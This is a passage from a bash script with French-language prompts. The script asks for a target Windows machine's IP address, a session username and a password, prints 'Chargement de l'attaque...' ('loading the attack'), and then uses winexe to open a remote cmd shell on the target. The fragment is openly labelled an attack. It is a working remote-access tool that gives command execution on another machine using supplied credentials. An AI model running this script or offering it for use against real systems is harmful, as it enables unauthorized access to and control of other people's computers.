...
echo -e -n "$MAGENTA [>]$CYAN Entrez l'IP de la machine sous Windows ciblée : $DEFAULT"
read cible

echo -e -n "$MAGENTA [>]$CYAN Entrez le nom de la session Windows ciblée : $DEFAULT"
read session

echo -e -n "$MAGENTA [>]$CYAN Entrez le mot de passe de la session (entrez$ORANGE no_pass$CYAN si la session ne comporte pas de mot de passe) : $DEFAULT"
read mdp

echo -e "$BLUE [...]$CYAN Chargement de l'attaque... $DEFAULT"

if [ "$mdp" = "no_pass" ];then
	cat | winexe -U $session -N //$cible cmd
else
	cat | winexe -U $session%$mdp //$cible cmd
fi
